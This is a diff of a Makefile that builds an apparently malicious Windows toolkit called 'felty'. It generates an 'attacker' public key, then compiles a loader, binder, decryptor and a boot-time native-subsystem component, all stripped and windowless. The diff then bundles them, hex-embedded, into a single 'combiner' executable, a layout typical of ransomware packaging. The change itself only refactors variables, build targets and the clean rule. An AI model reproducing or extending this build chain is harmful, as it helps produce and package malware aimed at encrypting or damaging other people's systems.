@@ -9,48 +9,37 @@ UPX   = upx
 XXD   = xxd
 PY    = python3
 
-# Common flags
 CFLAGS_BASE = -Os -s -Wall
 LFLAGS64 = -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32
 LFLAGS32 = $(LFLAGS64)
 WINFLAGS = -mwindows
 
-# Source files
-SRC_LOADER  = felty_loader.c
-SRC_BINDER  = felty_binder.c
-SRC_DECRYPT = felty_decrypt.c
-SRC_BOOT    = felty_boot.c
-SRC_COMBINER= combiner.c
+SRC_LOADER   = felty_loader.c
+SRC_BINDER   = felty_binder.c
+SRC_DECRYPT  = felty_decrypt.c
+SRC_BOOT     = felty_boot.c
+SRC_COMBINER = combiner.c
 
-# Generated files
-KEYGEN_OUT      = attacker_pubkey.h
-LOADER_EXE_H    = felty_loader_exe.h
-BINDER_EXE_H    = felty_binder_exe.h
-DECRYPT_EXE_H   = felty_decrypt_exe.h
-COMBINER_X64    = x64/combiner.exe
-
-# Output directories
+KEYGEN_OUT = attacker_pubkey.h
 X64DIR = x64
 WIN32DIR = win32
 
-# ================== Targets ==================
-.PHONY: all clean combine
+.PHONY: all clean combine combine_x64 combine_win32
 
+# Default builds everything except the combiner (combine is separate)
 all: dirs keygen x64 win32
 
-# Create output dirs
 dirs:
 	mkdir -p $(X64DIR) $(WIN32DIR)
 
-# Generate attacker keys (only if needed)
-keygen: attacker_pubkey.h
+keygen: $(KEYGEN_OUT)
 
-attacker_pubkey.h: felty_keygen.py
+$(KEYGEN_OUT): felty_keygen.py
 	@echo "[*] Generating attacker keys..."
 	$(PY) felty_keygen.py
 
-# ================== 64-bit Build ==================
-x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe combine_x64
+# ================== 64-bit Binaries ==================
+x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe
 
 $(X64DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(X64DIR)
 	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
@@ -69,8 +58,8 @@ $(X64DIR)/felty_boot.exe: $(SRC_BOOT) | $(X64DIR)
 	$(CC64) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e NtProcessStartup -o $@ $< -lntdll
 	$(STRIP) --strip-all $@
 
-# ================== 32-bit Build ==================
-win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe combine_win32
+# ================== 32-bit Binaries ==================
+win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe
 
 $(WIN32DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(WIN32DIR)
 	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
@@ -92,35 +81,29 @@ $(WIN32DIR)/felty_boot.exe: $(SRC_BOOT) | $(WIN32DIR)
 # ================== Combiner (single EXE) ==================
 combine: combine_x64 combine_win32
 
-combine_x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe combiner.c
+combine_x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(SRC_COMBINER)
 	@echo "[*] Building 64-bit combiner..."
-	$(XXD) -i $(X64DIR)/felty_loader.exe > $(LOADER_EXE_H)
-	$(XXD) -i $(X64DIR)/felty_binder.exe > $(BINDER_EXE_H)
-	$(XXD) -i $(X64DIR)/felty_decrypt.exe > $(DECRYPT_EXE_H)
-	$(CC64) $(CFLAGS_BASE) -o $(COMBINER_X64) combiner.c $(WINFLAGS) \
-	    -I. -include $(LOADER_EXE_H) -include $(BINDER_EXE_H) -include $(DECRYPT_EXE_H)
-	$(STRIP) --strip-all $(COMBINER_X64)
-	@echo "[+] Built: $(COMBINER_X64)"
+	$(XXD) -i $(X64DIR)/felty_loader.exe > felty_loader_exe.h
+	$(XXD) -i $(X64DIR)/felty_binder.exe > felty_binder_exe.h
+	$(XXD) -i $(X64DIR)/felty_decrypt.exe > felty_decrypt_exe.h
+	$(CC64) $(CFLAGS_BASE) -o $(X64DIR)/combiner.exe $(SRC_COMBINER) $(WINFLAGS) -l shell32 \
+	    -I. -include felty_loader_exe.h -include felty_binder_exe.h -include felty_decrypt_exe.h \
+	    -DFELTY_USE_X64_NAMES
+	$(STRIP) --strip-all $(X64DIR)/combiner.exe
+	@echo "[+] Built: $(X64DIR)/combiner.exe"
 
-combine_win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe combiner.c
+combine_win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(SRC_COMBINER)
 	@echo "[*] Building 32-bit combiner..."
-	$(XXD) -i $(WIN32DIR)/felty_loader.exe > $(LOADER_EXE_H)
-	$(XXD) -i $(WIN32DIR)/felty_binder.exe > $(BINDER_EXE_H)
-	$(XXD) -i $(WIN32DIR)/felty_decrypt.exe > $(DECRYPT_EXE_H)
-	$(CC32) $(CFLAGS_BASE) -o $(WIN32DIR)/combiner.exe combiner.c $(WINFLAGS) \
-	    -I. -include $(LOADER_EXE_H) -include $(BINDER_EXE_H) -include $(DECRYPT_EXE_H)
+	$(XXD) -i $(WIN32DIR)/felty_loader.exe > felty_loader_exe.h
+	$(XXD) -i $(WIN32DIR)/felty_binder.exe > felty_binder_exe.h
+	$(XXD) -i $(WIN32DIR)/felty_decrypt.exe > felty_decrypt_exe.h
+	$(CC32) $(CFLAGS_BASE) -o $(WIN32DIR)/combiner.exe $(SRC_COMBINER) $(WINFLAGS) -l shell32 \
+	    -I. -include felty_loader_exe.h -include felty_binder_exe.h -include felty_decrypt_exe.h \
+	    -DFELTY_USE_WIN32_NAMES
 	$(STRIP) --strip-all $(WIN32DIR)/combiner.exe
 	@echo "[+] Built: $(WIN32DIR)/combiner.exe"
 
 # ================== Clean ==================
 clean:
-	rm -rf $(X64DIR) $(WIN32DIR) *.exe $(KEYGEN_OUT) $(LOADER_EXE_H) $(BINDER_EXE_H) $(DECRYPT_EXE_H) *.o
+	rm -rf $(X64DIR) $(WIN32DIR) *.exe $(KEYGEN_OUT) felty_loader_exe.h felty_binder_exe.h felty_decrypt_exe.h *.o
 	@echo "[*] Cleaned."
-
-# ================== Help ==================
-help:
-	@echo "Usage:"
-	@echo "  make          - Build x64 & win32 binaries"
-	@echo "  make combine  - Build single combiner EXE"
-	@echo "  make clean    - Remove all built files"
-	@echo "  make keygen   - Generate attacker keys only"
